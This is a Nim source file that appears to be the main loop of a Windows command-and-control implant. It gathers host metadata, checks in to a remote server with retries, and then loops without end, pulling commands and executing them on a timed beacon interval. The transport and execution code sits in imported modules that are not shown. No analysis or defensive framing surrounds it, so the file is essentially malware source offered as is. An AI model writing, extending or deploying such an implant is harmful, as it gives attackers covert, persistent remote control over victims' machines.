import std/[times, os]
import ./[meta, config, utils]
import transport/protocol
import cmd/cmd
import winim

proc should_exit(): bool = false

proc checkin(): bool =
    var meta_data = gen_metadata()
    if meta_data.len == 0: 
        dbg "[-] generate metadata failed"
        return false

    for i in 1 .. check_in_max_retries:
        dbg "[+] attempt check in " & $i
        try:
            discard send_request(meta_data, checkin=true)
            return true
        except CatchableError:
            sleep(10*1000)
    return false

proc beacon() =
    let start_time = times.now()
    dbg "[+] Started at: " & start_time.format("yyyy-MM-dd HH:mm:ss")

    if checkin(): dbg "[+] check in succeded"
    else:
        dbg("[-] failed to checkin")
        quit(-1)
    
    # quit(0)
    sleep(sleep_interval)
    # read command and exe
    while true:
        if should_exit():
            dbg "[+] should exit, quiiting..."
            quit(1)
        
        pull_command_and_exec()
        sleep(sleep_interval)

when isMainModule:
    when not defined(release): 
        dbg "[+] debug mode"
    beacon()
